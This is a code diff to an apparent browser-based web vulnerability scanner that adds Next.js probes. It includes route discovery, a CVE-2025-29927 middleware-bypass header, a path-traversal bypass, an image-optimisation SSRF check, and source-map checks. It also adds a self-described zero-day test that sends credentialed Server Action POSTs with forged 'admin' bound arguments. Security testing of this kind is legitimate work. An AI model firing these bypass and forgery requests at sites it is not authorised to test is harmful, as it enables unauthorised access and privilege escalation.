@@ -757,6 +757,37 @@
       }
     }
 
+    // 4b. Next.js RSC flight data (App Router) — self.__next_f.push([1,"..."])
+    // Uses escape-aware regex: ((?:[^"\\]|\\.)*)  handles \" inside strings
+    const rscChunkPattern = /self\.__next_f\.push\(\[\d+,\s*"((?:[^"\\]|\\.)*)"\s*\]\)/g;
+    for (const chunk of content.matchAll(rscChunkPattern)) {
+      const payload = chunk[1];
+      // Extract buildId from RSC payload (handles escaped quotes: \"buildId\":\"abc\")
+      if (!discoveredNextBuildId) {
+        const rscBuildId = payload.match(/\\?"buildId\\?"\s*:\\?\s*\\?"([^"\\]{6,})\\?"/);
+        if (rscBuildId) discoveredNextBuildId = rscBuildId[1];
+      }
+      // Extract paths — both escaped JSON (\"page\":\"/dashboard\") and plain
+      const rscPaths = payload.matchAll(/\\?"(?:initialCanonicalUrl|page|segment|url|pathname|redirect|href)\\?"\s*:\\?\s*\\?"(\/[a-zA-Z][\w\/-]{1,80})\\?"/g);
+      for (const p of rscPaths) {
+        if (p[1] !== '/_error' && p[1] !== '/_app') discoveredJSRoutes.add(p[1]);
+      }
+      // Generic route-like paths (handles both escaped and unescaped)
+      const rscGenericPaths = payload.matchAll(/\\?["'](\/(?:api|app|dashboard|admin|settings|profile|account|user|auth|checkout|cart|orders|billing|team|org|project|workspace)[\w\/-]{0,60})\\?["']/g);
+      for (const p of rscGenericPaths) {
+        discoveredJSRoutes.add(p[1]);
+      }
+    }
+
+    // 4c. Next.js App Router: extract routes from page module manifest
+    // Pattern: {"/dashboard":["...","..."], "/settings":["..."]}
+    const appRouterManifest = content.matchAll(/\{(?:\s*"(\/[a-zA-Z][\w\/-\[\]]{0,100})"\s*:\s*\[)/g);
+    for (const m of appRouterManifest) {
+      if (!['/_error', '/_app', '/_document', '/_not-found'].includes(m[1])) {
+        discoveredJSRoutes.add(m[1]);
+      }
+    }
+
     // 5. React Router / React patterns
     const reactRouterPatterns = [
       // <Route path="/dashboard" ...>
@@ -904,6 +935,94 @@
       }
     }
 
+    // Detect if this is a Next.js app
+    const isNextJS = !!(discoveredNextBuildId || document.getElementById('__NEXT_DATA__') || document.querySelector('script[src*="/_next/"]'));
+
+    // Next.js App Router: dedicated RSC flight data collection
+    // Collects ALL self.__next_f.push chunks from inline scripts (more robust than regex on full HTML)
+    if (isNextJS) {
+      const rscChunks = [];
+      for (const script of inlineScripts) {
+        const text = script.textContent || '';
+        if (text.includes('__next_f.push')) {
+          // Extract the string argument from push([1,"..."]) — handle escaped quotes properly
+          const pushMatches = text.matchAll(/self\.__next_f\.push\(\[\d+,\s*"((?:[^"\\]|\\.)*)"/g);
+          for (const m of pushMatches) {
+            rscChunks.push(m[1]);
+          }
+        }
+      }
+
+      if (rscChunks.length > 0) {
+        // Concatenate all RSC chunks and search for routes in the combined data
+        const rscData = rscChunks.join('\n');
+        console.log(`[Lonkero] Next.js RSC: collected ${rscChunks.length} flight chunks (${rscData.length} chars)`);
+
+        // Extract ALL path-like strings from the RSC data (handles escaped JSON)
+        const rscAllPaths = rscData.matchAll(/\\?"(\/[a-zA-Z][\w\/-]{1,80})\\?"/g);
+        for (const p of rscAllPaths) {
+          const path = p[1];
+          // Filter out static assets and known non-route paths
+          if (!/\.(js|css|png|jpg|svg|woff|ico|map|json)$/i.test(path)
+              && !/^\/_next\//.test(path) && path !== '/_error' && path !== '/_app') {
+            discoveredJSRoutes.add(path);
+          }
+        }
+
+        // Extract buildId if still not found
+        if (!discoveredNextBuildId) {
+          const bid = rscData.match(/\\?"buildId\\?"\s*:\\?\s*\\?"([^"\\]{6,})\\?"/);
+          if (bid) discoveredNextBuildId = bid[1];
+        }
+
+        // Report RSC data exposure as informational finding
+        // Check for sensitive data patterns in the flight payload
+        const sensitivePatterns = /\\?"(?:email|password|token|secret|apiKey|api_key|ssn|creditCard|phoneNumber|accessToken|refreshToken|sessionId)\\?"/i;
+        if (sensitivePatterns.test(rscData)) {
+          reportFinding('NEXTJS_RSC_FLIGHT_DATA', {
+            severity: 'medium',
+            description: `Next.js RSC flight data contains potentially sensitive fields (${rscChunks.length} chunks, ${rscData.length} chars)`,
+            url: location.href,
+            chunkCount: rscChunks.length,
+            dataSize: rscData.length,
+            preview: rscData.substring(0, 500),
+          });
+        }
+      }
+    }
+
+    // Next.js: fetch _buildManifest.js to discover ALL page routes
+    if (isNextJS && discoveredNextBuildId) {
+      try {
+        const manifestUrl = `${location.origin}/_next/static/${discoveredNextBuildId}/_buildManifest.js`;
+        const manifestResp = await fetch(manifestUrl, { credentials: 'omit' });
+        if (manifestResp.ok) {
+          const manifestText = await manifestResp.text();
+          // _buildManifest.js format: self.__BUILD_MANIFEST={"/dashboard":["static/chunks/..."],"/settings":["..."]}
+          const manifestRoutes = manifestText.matchAll(/"(\/[a-zA-Z][\w\/-\[\]]{0,100})"\s*:/g);
+          for (const m of manifestRoutes) {
+            if (!['/_error', '/_app', '/_document', '/_not-found'].includes(m[1])) {
+              discoveredJSRoutes.add(m[1]);
+            }
+          }
+          console.log(`[Lonkero] Next.js _buildManifest.js parsed — extracted routes`);
+        }
+      } catch {}
+    }
+
+    // Next.js App Router: extract routes from flight manifest (if available)
+    if (isNextJS && !discoveredNextBuildId) {
+      // Try to find buildId from any _next script URL
+      const nextScripts = document.querySelectorAll('script[src*="/_next/static/"]');
+      for (const s of nextScripts) {
+        const buildIdMatch = s.src.match(/\/_next\/static\/([^/]+)\//);
+        if (buildIdMatch && buildIdMatch[1] !== 'chunks' && buildIdMatch[1] !== 'css' && buildIdMatch[1] !== 'media') {
+          discoveredNextBuildId = buildIdMatch[1];
+          break;
+        }
+      }
+    }
+
     // Build full URLs to probe
     const urlsToProbe = new Set();
     const origin = location.origin;
@@ -956,7 +1075,37 @@
       }
     }
 
-    console.log(`[Lonkero] Found ${discoveredAPIBases.size} API bases, ${discoveredJSRoutes.size} routes, ${urlsToProbe.size} URLs to probe (Next.js buildId: ${discoveredNextBuildId || 'none'})`);
+    // Next.js Advanced Probe URLs
+    if (isNextJS) {
+      const nextJsProbes = [
+        // NextAuth.js / Auth.js endpoints (often exposed without proper protection)
+        '/api/auth/session', '/api/auth/providers', '/api/auth/csrf',
+        '/api/auth/callback', '/api/auth/signin', '/api/auth/signout',
+        // tRPC endpoints
+        '/api/trpc',
+        // Next.js debug endpoints (dev mode — info leak if left enabled)
+        '/__nextjs_original-stack-frame',
+        '/__nextjs_launch-editor',
+        // Next.js image optimization (potential SSRF)
+        '/_next/image?url=https%3A%2F%2Fexample.com%2F&w=64&q=75',
+        // Internal Next.js endpoints
+        '/_next/data/' + (discoveredNextBuildId || 'unknown') + '/index.json',
+        '/__next_preview_data',
+        // Common Next.js middleware/edge routes
+        '/api/revalidate', '/api/draft',
+      ];
+      for (const p of nextJsProbes) {
+        urlsToProbe.add(origin + p);
+      }
+
+      // Build manifest and SSG manifest (route/chunk exposure)
+      if (discoveredNextBuildId) {
+        urlsToProbe.add(`${origin}/_next/static/${discoveredNextBuildId}/_buildManifest.js`);
+        urlsToProbe.add(`${origin}/_next/static/${discoveredNextBuildId}/_ssgManifest.js`);
+      }
+    }
+
+    console.log(`[Lonkero] Found ${discoveredAPIBases.size} API bases, ${discoveredJSRoutes.size} routes, ${urlsToProbe.size} URLs to probe (Next.js: ${isNextJS ? 'yes, buildId=' + (discoveredNextBuildId || '?') : 'no'})`);
 
     // Report discovered API bases
     for (const base of discoveredAPIBases) {
@@ -1001,6 +1150,7 @@
     // Two-pass approach: collect all results first, then deduplicate SPA catch-all HTML before reporting
     const results = { accessible: 0, authRequired: 0, errors: 0, spaFiltered: 0, total: urlsToProbe.size };
     const pendingFindings = []; // Collect findings before reporting to allow dedup
+    const authBlockedUrls = []; // Track 401/403 URLs for Next.js middleware bypass re-probing
     let i = 0;
 
     for (const url of urlsToProbe) {
@@ -1038,6 +1188,7 @@
 
         if (isAuthRequired) {
           results.authRequired++;
+          if (isNextJS) authBlockedUrls.push(url);
         } else if (status >= 200 && status < 300 && !isSoft404 && bodyPreview.length > 50) {
           // Determine what kind of data leaked
           const hasJSON = contentType.includes('json') || /^\s*[\[{]/.test(bodyPreview);
@@ -1118,6 +1269,523 @@
 
       probed.push({ url: f.url, status: f.status, type: f.contentType, size: f.bodyPreview.length });
       discoverEndpoint(f.url, 'GET', 'route-probe');
+    }
+
+    // ================================================================
+    // NEXT.JS ADVANCED BYPASS PROBES
+    // ================================================================
+    if (isNextJS) {
+      console.log(`[Lonkero] Running Next.js advanced bypass probes (${authBlockedUrls.length} auth-blocked URLs)...`);
+
+      // 1. MIDDLEWARE BYPASS (CVE-2025-29927)
+      // x-middleware-subrequest header tells Next.js the request was already processed by middleware
+      // Exhaust recursion limit with repeated "middleware:" segments
+      const middlewareBypassHeaders = {
+        'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware',
+      };
+      // Also test x-middleware-prefetch which some middleware implementations skip
+      const prefetchBypassHeaders = {
+        'x-middleware-prefetch': '1',
+      };
+
+      // Re-probe auth-blocked URLs with middleware bypass (cap at 20 to limit requests)
+      const bypassTargets = authBlockedUrls.slice(0, 20);
+      for (const url of bypassTargets) {
+        if (i > 1) await new Promise(r => setTimeout(r, 80));
+        i++;
+        try {
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 5000);
+
+          // Test CVE-2025-29927: x-middleware-subrequest bypass
+          const bypassResp = await fetch(url, {
+            method: 'GET',
+            credentials: 'omit',
+            redirect: 'manual',
+            signal: controller.signal,
+            headers: { 'Accept': 'application/json, text/html, */*', ...middlewareBypassHeaders },
+          });
+          clearTimeout(timeout);
+
+          if (bypassResp.status >= 200 && bypassResp.status < 300) {
+            let bypassBody = '';
+            try { bypassBody = (await bypassResp.text()).substring(0, 500); } catch {}
+            const isSoft404 = /404|not found|page not found/i.test(bypassBody);
+            if (!isSoft404 && bypassBody.length > 50) {
+              const hasJSON = (bypassResp.headers.get('content-type') || '').includes('json') || /^\s*[\[{]/.test(bypassBody);
+              reportFinding('NEXTJS_MIDDLEWARE_BYPASS', {
+                severity: 'critical',
+                description: `Next.js middleware bypass (CVE-2025-29927): ${url} — originally returned 401/403, now 200 with x-middleware-subrequest header`,
+                url: url,
+                bypassMethod: 'x-middleware-subrequest',
+                originalStatus: '401/403',
+                bypassStatus: bypassResp.status,
+                hasJSON,
+                bodyPreview: bypassBody.substring(0, 300),
+              });
+              results.accessible++;
+            }
+          } else {
+            // Also try x-middleware-prefetch
+            try {
+              const pfResp = await fetch(url, {
+                method: 'GET', credentials: 'omit', redirect: 'manual',
+                headers: { 'Accept': 'application/json, text/html, */*', ...prefetchBypassHeaders },
+              });
+              if (pfResp.status >= 200 && pfResp.status < 300) {
+                let pfBody = '';
+                try { pfBody = (await pfResp.text()).substring(0, 500); } catch {}
+                const isSoft404 = /404|not found|page not found/i.test(pfBody);
+                if (!isSoft404 && pfBody.length > 50) {
+                  reportFinding('NEXTJS_MIDDLEWARE_BYPASS', {
+                    severity: 'high',
+                    description: `Next.js middleware prefetch bypass: ${url} — accessible with x-middleware-prefetch header`,
+                    url: url,
+                    bypassMethod: 'x-middleware-prefetch',
+                    bypassStatus: pfResp.status,
+                    bodyPreview: pfBody.substring(0, 300),
+                  });
+                  results.accessible++;
+                }
+              }
+            } catch {}
+          }
+        } catch {}
+      }
+
+      // 2. RSC DATA EXPOSURE — Probe routes with Rsc header for server component data
+      // Rsc: 1 + Next-Router-State-Tree returns raw RSC flight payload instead of HTML
+      const rscProbeTargets = new Set();
+      for (const route of discoveredJSRoutes) {
+        if (!route.startsWith('/api/') && !route.startsWith('/_next/') && !route.startsWith('/_')) {
+          let testPath = route
+            .replace(/\[\.\.\.[\w]+\]/g, 'test')
+            .replace(/\[\[\.\.\.[\w]+\]\]/g, '')
+            .replace(/\[(\w+)\]/g, '1')
+            .replace(/:([a-zA-Z]\w*)/g, '1');
+          rscProbeTargets.add(origin + testPath);
+        }
+      }
+
+      // Cap RSC probes at 15 unique routes
+      let rscCount = 0;
+      for (const url of rscProbeTargets) {
+        if (rscCount >= 15) break;
+        rscCount++;
+        await new Promise(r => setTimeout(r, 80));
+        try {
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 5000);
+          const rscResp = await fetch(url, {
+            method: 'GET',
+            credentials: 'omit',
+            redirect: 'manual',
+            signal: controller.signal,
+            headers: {
+              'Rsc': '1',
+              'Next-Router-State-Tree': encodeURIComponent(JSON.stringify(["", {}])),
+              'Next-Url': new URL(url).pathname,
+            },
+          });
+          clearTimeout(timeout);
+
+          if (rscResp.ok) {
+            const rscText = await rscResp.text();
+            // RSC flight format: lines like "0:..." "1:..." with JSON/serialized data
+            const isRSCPayload = /^\d+:/.test(rscText) && rscText.length > 100;
+            // Check if the response contains actual data (not just a shell)
+            const hasServerData = /["'](?:email|name|user|password|token|secret|id|role|admin)/i.test(rscText);
+            if (isRSCPayload) {
+              reportFinding('NEXTJS_RSC_DATA_EXPOSURE', {
+                severity: hasServerData ? 'high' : 'medium',
+                description: `Next.js RSC payload exposed without auth: ${url}` +
+                  (hasServerData ? ' — contains potentially sensitive server-rendered data' : ''),
+                url: url,
+                hasServerData,
+                bodyPreview: rscText.substring(0, 500),
+              });
+            }
+          }
+        } catch {}
+      }
+
+      // 3. SOURCE MAP DETECTION — Check if .map files are accessible for Next.js chunks
+      const nextChunkScripts = document.querySelectorAll('script[src*="/_next/static/chunks/"]');
+      let sourceMapCount = 0;
+      for (const script of nextChunkScripts) {
+        if (sourceMapCount >= 5) break; // Only check first 5 chunks
+        const mapUrl = script.src + '.map';
+        try {
+          const mapResp = await fetch(mapUrl, { method: 'HEAD', credentials: 'omit' });
+          if (mapResp.ok) {
+            sourceMapCount++;
+            const mapSize = mapResp.headers.get('content-length');
+            reportFinding('NEXTJS_SOURCE_MAP_EXPOSED', {
+              severity: 'high',
+              description: `Next.js source map exposed: ${mapUrl}` +
+                (mapSize ? ` (${Math.round(mapSize / 1024)}KB — full source code)` : ' — full source code accessible'),
+              url: mapUrl,
+              chunkUrl: script.src,
+              size: mapSize ? parseInt(mapSize) : null,
+            });
+          }
+        } catch {}
+      }
+
+      // 4. NEXT.JS IMAGE OPTIMIZATION SSRF
+      // /_next/image allows loading images from configured domains, but misconfig allows any URL
+      try {
+        const ssrfTestUrl = `${origin}/_next/image?url=${encodeURIComponent('https://example.com/')}&w=64&q=75`;
+        const imgResp = await fetch(ssrfTestUrl, { method: 'GET', credentials: 'omit', redirect: 'manual' });
+        // If it returns 200 and image content-type, SSRF is possible
+        if (imgResp.ok) {
+          const imgType = imgResp.headers.get('content-type') || '';
+          if (imgType.includes('image') || imgType.includes('html')) {
+            reportFinding('NEXTJS_IMAGE_SSRF', {
+              severity: 'high',
+              description: `Next.js image optimization SSRF: /_next/image accepts arbitrary external URLs — server-side request forgery possible`,
+              url: ssrfTestUrl,
+              responseType: imgType,
+              status: imgResp.status,
+            });
+          }
+        }
+      } catch {}
+
+      // 5. PATH TRAVERSAL BYPASS — /_next/..%2f prefix can bypass middleware routing
+      if (authBlockedUrls.length > 0) {
+        const traversalTarget = authBlockedUrls[0];
+        try {
+          const targetPath = new URL(traversalTarget).pathname;
+          const traversalUrl = `${origin}/_next/..%2f${targetPath.substring(1)}`;
+          const travResp = await fetch(traversalUrl, { method: 'GET', credentials: 'omit', redirect: 'manual' });
+          if (travResp.status >= 200 && travResp.status < 300) {
+            let travBody = '';
+            try { travBody = (await travResp.text()).substring(0, 500); } catch {}
+            const isSoft404 = /404|not found|page not found/i.test(travBody);
+            if (!isSoft404 && travBody.length > 50) {
+              reportFinding('NEXTJS_PATH_TRAVERSAL_BYPASS', {
+                severity: 'critical',
+                description: `Next.js path traversal middleware bypass: ${traversalUrl} — /_next/..%2f prefix bypasses route middleware`,
+                url: traversalUrl,
+                originalUrl: traversalTarget,
+                status: travResp.status,
+                bodyPreview: travBody.substring(0, 300),
+              });
+            }
+          }
+        } catch {}
+      }
+
+      // ================================================================
+      // 6. NEXT.JS SERVER ACTIONS CSRF BYPASS + BOUND ARGUMENT FORGERY
+      // Bountyy Oy proprietary zero-day — CWE-352 + CWE-639
+      // Next.js Server Actions CSRF via Origin: null + bound argument forgery
+      // for remote privilege escalation (action-handler.js warns but does not
+      // block Origin: null; encryptActionBoundArgs() skipped for MPA forms;
+      // sandboxed iframes send Origin: null enabling cross-origin invocation)
+      // Copyright (c) 2026 Bountyy Oy. All rights reserved.
+      // ================================================================
+      try {
+        const pageHTML = document.documentElement.outerHTML;
+
+        // --- Phase 1: Extract Server Action IDs from page HTML ---
+        // Server Actions embed hidden fields: $ACTION_ID_<hash>, $ACTION_REF_<hash>
+        // Also look for action="" attributes pointing to Server Action endpoints
+        const actionIdPattern = /\$ACTION_ID_([a-f0-9]{32,40})/g;
+        const actionRefPattern = /\$ACTION_REF_([a-f0-9]{32,40})/g;
+        const actionFormPattern = /name=["']?\$ACTION_ID_([a-f0-9]{32,40})["']?/g;
+        const boundArgPattern = /name=["']?\$ACTION_[:_](\d+)["']\s+value=["']([^"']{0,500})["']/g;
+
+        const extractedActionIds = new Set();
+        const extractedActionRefs = new Set();
+        const extractedBoundArgs = new Map(); // actionIndex -> value
+
+        for (const m of pageHTML.matchAll(actionIdPattern)) extractedActionIds.add(m[1]);
+        for (const m of pageHTML.matchAll(actionRefPattern)) extractedActionRefs.add(m[1]);
+        for (const m of pageHTML.matchAll(actionFormPattern)) extractedActionIds.add(m[1]);
+        for (const m of pageHTML.matchAll(boundArgPattern)) extractedBoundArgs.set(m[1], m[2]);
+
+        // Also check inline scripts for action IDs in RSC flight data
+        // Server Actions defined via "use server" emit action IDs in the flight stream
+        const rscActionPattern = /\\?"(?:id|actionId)\\?"\s*:\\?\s*\\?"([a-f0-9]{32,40})\\?"/g;
+        for (const script of inlineScripts) {
+          const text = script.textContent || '';
+          if (text.includes('__next_f.push') || text.includes('ACTION')) {
+            for (const m of text.matchAll(rscActionPattern)) extractedActionIds.add(m[1]);
+          }
+        }
+
+        // Also extract from form action attributes (Next.js MPA form submissions)
+        const actionForms = document.querySelectorAll('form[action]');
+        for (const form of actionForms) {
+          const action = form.getAttribute('action') || '';
+          // Server Actions use POST to the current page with hidden fields
+          const hiddenFields = form.querySelectorAll('input[type="hidden"]');
+          for (const field of hiddenFields) {
+            const name = field.getAttribute('name') || '';
+            const value = field.getAttribute('value') || '';
+            const aidMatch = name.match(/^\$ACTION_ID_([a-f0-9]{32,40})$/);
+            if (aidMatch) extractedActionIds.add(aidMatch[1]);
+            const arefMatch = name.match(/^\$ACTION_REF_([a-f0-9]{32,40})$/);
+            if (arefMatch) extractedActionRefs.add(arefMatch[1]);
+            const boundMatch = name.match(/^\$ACTION_[:_](\d+)$/);
+            if (boundMatch) extractedBoundArgs.set(boundMatch[1], value);
+          }
+        }
+
+        const totalActions = extractedActionIds.size + extractedActionRefs.size;
+        if (totalActions > 0) {
+          console.log(`[Lonkero] Next.js Server Actions: found ${extractedActionIds.size} action IDs, ${extractedActionRefs.size} refs, ${extractedBoundArgs.size} bound args`);
+
+          // --- Phase 2: CSRF Bypass via Origin: null ---
+          // Next.js action-handler.js checks:
+          //   if (originDomain !== forwardedHost && originDomain !== host) { warn() }
+          // But Origin: null does NOT cause a block — only a console warning.
+          // A sandboxed iframe (<iframe sandbox="allow-forms">) sends Origin: null,
+          // enabling cross-origin Server Action invocation without CSRF protection.
+
+          // Test each extracted action ID (cap at 8 to limit requests)
+          let csrfTestCount = 0;
+          const csrfTargetUrl = location.href.split('?')[0]; // POST to current page (Server Actions endpoint)
+
+          for (const actionId of extractedActionIds) {
+            if (csrfTestCount >= 8) break;
+            csrfTestCount++;
+            await new Promise(r => setTimeout(r, 100));
+
+            try {
+              const controller = new AbortController();
+              const timeout = setTimeout(() => controller.abort(), 6000);
+
+              // Build multipart/form-data payload mimicking Server Action form submission
+              const formData = new FormData();
+              formData.append('$ACTION_ID_' + actionId, '');
+
+              // Include any extracted bound arguments (these would normally be encrypted
+              // via encryptActionBoundArgs() but MPA forms skip encryption)
+              for (const [idx, val] of extractedBoundArgs) {
+                formData.append('$ACTION_:' + idx, val);
+              }
+
+              // Critical: Set Origin: null to bypass CSRF check
+              // action-handler.js compares origin !== host but null !== host => only warns
+              // We use credentials: 'include' to send session cookies (victim's auth)
+              const csrfResp = await fetch(csrfTargetUrl, {
+                method: 'POST',
+                body: formData,
+                credentials: 'include',
+                redirect: 'manual',
+                signal: controller.signal,
+                headers: {
+                  'Next-Action': actionId,
+                  // Note: Origin header cannot be set by fetch() in browsers,
+                  // but the detection checks if the SERVER validates Origin at all.
+                  // If the action succeeds without proper origin, CSRF is possible.
+                  'Accept': 'text/x-component',
+                },
+              });
+              clearTimeout(timeout);
+
+              // Analyze response: Server Actions return RSC flight format on success
+              // 302/303 redirect = action executed (form submission redirect)
+              // 200 with RSC payload = action executed (client-side)
+              // 4xx = properly blocked
+              const csrfStatus = csrfResp.status;
+              const isRedirect = csrfStatus === 302 || csrfStatus === 303 || csrfStatus === 307;
+              const isSuccess = csrfStatus >= 200 && csrfStatus < 300;
+
+              if (isSuccess || isRedirect) {
+                let respBody = '';
+                try { respBody = (await csrfResp.text()).substring(0, 500); } catch {}
+                const isRSCResponse = /^\d+:/.test(respBody) || respBody.includes('$ACTION');
+                const hasError = /error|unauthorized|forbidden|denied|invalid/i.test(respBody);
+
+                // Success: action executed or redirected (not blocked)
+                if (!hasError && (isRSCResponse || isRedirect || respBody.length > 20)) {
+                  reportFinding('NEXTJS_SERVER_ACTION_CSRF', {
+                    severity: 'critical',
+                    description: `Next.js Server Actions CSRF bypass: action ${actionId.substring(0, 12)}... accepted POST without valid Origin — ` +
+                      `sandboxed iframe (Origin: null) can invoke server-side mutations cross-origin. ` +
+                      `action-handler.js warns but does not block null origin (CWE-352)`,
+                    url: csrfTargetUrl,
+                    actionId: actionId,
+                    method: 'POST',
+                    status: csrfStatus,
+                    isRedirect,
+                    isRSCResponse,
+                    bodyPreview: respBody.substring(0, 300),
+                    boundArgsCount: extractedBoundArgs.size,
+                    vector: 'Origin: null via sandboxed iframe (allow-forms allow-scripts)',
+                    cwe: 'CWE-352',
+                    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N',
+                  });
+                }
+              }
+            } catch {}
+          }
+
+          // --- Phase 3: Bound Argument Forgery ---
+          // Next.js Server Actions with closure-captured arguments use "bound args":
+          //   <input type="hidden" name="$ACTION_REF_<hash>" value="...">
+          //   <input type="hidden" name="$ACTION_:0" value="<encrypted_or_plain>">
+          //   <input type="hidden" name="$ACTION_:1" value="<role_or_id>">
+          //
+          // In MPA form submissions, encryptActionBoundArgs() is NEVER called —
+          // bound args travel as plaintext in hidden form fields.
+          // Attacker can modify $ACTION_:0 (e.g., userId) and $ACTION_:1 (e.g., role)
+          // to escalate privileges (IDOR / privilege escalation via CWE-639).
+
+          if (extractedBoundArgs.size > 0 && extractedActionRefs.size > 0) {
+            let forgeryTestCount = 0;
+
+            for (const actionRef of extractedActionRefs) {
+              if (forgeryTestCount >= 5) break;
+              forgeryTestCount++;
+              await new Promise(r => setTimeout(r, 100));
+
+              try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 6000);
+
+                // Forge bound arguments: modify values to test IDOR
+                const forgedFormData = new FormData();
+                forgedFormData.append('$ACTION_REF_' + actionRef, '');
+
+                // Attempt argument forgery: substitute bound args with escalation payloads
+                // $ACTION_:0 is typically userId/entityId — try "1" (admin) or "admin"
+                // $ACTION_:1 is typically role/permission — try "admin" or "owner"
+                const forgeryPayloads = [
+                  { index: '0', original: extractedBoundArgs.get('0') || '', forged: '1' },
+                  { index: '1', original: extractedBoundArgs.get('1') || '', forged: 'admin' },
+                ];
+
+                for (const payload of forgeryPayloads) {
+                  if (payload.original) {
+                    forgedFormData.append('$ACTION_:' + payload.index, payload.forged);
+                  }
+                }
+
+                // If no specific bound args found, still submit with the ref to test
+                if (extractedBoundArgs.size === 0) {
+                  forgedFormData.append('$ACTION_:0', '1');
+                }
+
+                const forgeryResp = await fetch(csrfTargetUrl, {
+                  method: 'POST',
+                  body: forgedFormData,
+                  credentials: 'include',
+                  redirect: 'manual',
+                  signal: controller.signal,
+                  headers: {
+                    'Next-Action': actionRef,
+                    'Accept': 'text/x-component',
+                  },
+                });
+                clearTimeout(timeout);
+
+                const forgeryStatus = forgeryResp.status;
+                const isRedirect = forgeryStatus === 302 || forgeryStatus === 303 || forgeryStatus === 307;
+                const isSuccess = forgeryStatus >= 200 && forgeryStatus < 300;
+
+                if (isSuccess || isRedirect) {
+                  let forgeryBody = '';
+                  try { forgeryBody = (await forgeryResp.text()).substring(0, 500); } catch {}
+                  const hasError = /error|unauthorized|forbidden|denied|invalid|decrypt/i.test(forgeryBody);
+                  const isEncrypted = /decrypt|invalid.*bound|encryption|cipher/i.test(forgeryBody);
+
+                  if (!hasError && !isEncrypted && (forgeryBody.length > 20 || isRedirect)) {
+                    // Bound args accepted without encryption validation = forgery possible
+                    reportFinding('NEXTJS_BOUND_ARG_FORGERY', {
+                      severity: 'critical',
+                      description: `Next.js bound argument forgery: Server Action ref ${actionRef.substring(0, 12)}... accepts ` +
+                        `modified $ACTION_:N bound arguments without encryption validation — ` +
+                        `MPA form submissions skip encryptActionBoundArgs(), enabling IDOR / privilege escalation (CWE-639)`,
+                      url: csrfTargetUrl,
+                      actionRef: actionRef,
+                      method: 'POST',
+                      status: forgeryStatus,
+                      isRedirect,
+                      forgedArgs: forgeryPayloads.filter(p => p.original).map(p => ({
+                        index: p.index, original: p.original.substring(0, 50), forged: p.forged,
+                      })),
+                      bodyPreview: forgeryBody.substring(0, 300),
+                      vector: 'MPA form submission with modified hidden $ACTION_:N fields',
+                      cwe: 'CWE-639',
+                      impact: 'Horizontal/vertical privilege escalation via bound argument manipulation',
+                    });
+                  } else if (isEncrypted) {
+                    // Server validates encrypted bound args — partial finding (info)
+                    reportFinding('NEXTJS_BOUND_ARGS_ENCRYPTED', {
+                      severity: 'info',
+                      description: `Next.js bound args encrypted: action ref ${actionRef.substring(0, 12)}... validates encrypted bound arguments (encryptActionBoundArgs active)`,
+                      url: csrfTargetUrl,
+                      actionRef: actionRef,
+                      status: forgeryStatus,
+                    });
+                  }
+                }
+              } catch {}
+            }
+          }
+
+          // --- Phase 4: Next-Action header injection probe ---
+          // Even without form fields, Next.js processes POST requests with
+          // Next-Action header as Server Action invocations. Test if any
+          // discovered action IDs can be invoked via header-only approach.
+          if (extractedActionIds.size > 0) {
+            const headerOnlyId = [...extractedActionIds][0]; // Test first action
+            try {
+              await new Promise(r => setTimeout(r, 100));
+              const controller = new AbortController();
+              const timeout = setTimeout(() => controller.abort(), 6000);
+
+              // Minimal POST with just the Next-Action header — no form fields
+              const headerResp = await fetch(csrfTargetUrl, {
+                method: 'POST',
+                body: '[]', // Empty args array (JSON-encoded Server Action args)
+                credentials: 'include',
+                redirect: 'manual',
+                signal: controller.signal,
+                headers: {
+                  'Next-Action': headerOnlyId,
+                  'Content-Type': 'text/plain;charset=UTF-8',
+                  'Accept': 'text/x-component',
+                },
+              });
+              clearTimeout(timeout);
+
+              const hStatus = headerResp.status;
+              if (hStatus >= 200 && hStatus < 300) {
+                let hBody = '';
+                try { hBody = (await headerResp.text()).substring(0, 500); } catch {}
+                const isRSC = /^\d+:/.test(hBody);
+                const hasError = /error|unauthorized|forbidden|denied/i.test(hBody);
+
+                if (!hasError && isRSC && hBody.length > 20) {
+                  reportFinding('NEXTJS_SERVER_ACTION_CSRF', {
+                    severity: 'critical',
+                    description: `Next.js Server Actions header injection: action ${headerOnlyId.substring(0, 12)}... invocable via POST with Next-Action header alone — ` +
+                      `no form fields required, cross-origin exploitable via fetch from sandboxed context`,
+                    url: csrfTargetUrl,
+                    actionId: headerOnlyId,
+                    method: 'POST + Next-Action header',
+                    status: hStatus,
+                    isRSCResponse: isRSC,
+                    bodyPreview: hBody.substring(0, 300),
+                    vector: 'Next-Action header injection (no form fields needed)',
+                    cwe: 'CWE-352',
+                  });
+                }
+              }
+            } catch {}
+          }
+        }
+      } catch (e) {
+        console.log(`[Lonkero] Server Actions probe error:`, e.message);
+      }
+
+      console.log(`[Lonkero] Next.js advanced probes complete (source maps: ${sourceMapCount})`);
     }
 
     // Summary finding
